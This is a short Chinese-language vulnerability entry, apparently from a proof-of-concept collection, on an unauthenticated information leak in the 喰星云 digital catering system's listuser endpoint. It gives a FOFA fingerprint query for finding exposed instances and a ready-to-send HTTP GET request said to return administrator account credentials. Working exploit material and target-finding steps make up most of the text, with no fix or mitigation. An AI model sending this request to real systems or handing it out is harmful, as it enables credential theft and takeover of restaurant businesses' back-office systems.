## 喰星云-数字化餐饮服务系统listuser信息泄露漏洞

喰星云·数字化餐饮服务系统 listuser 接口处存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞读取后台管理员账号密码登录凭证信息，导致后台权限被控，造成信息泄露，使系统处于极不安全的状态。

## fofa

```
body="tmp_md5_pwd"
```

## poc

```
GET /chainsales/head/user/listuser HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407031710747.png)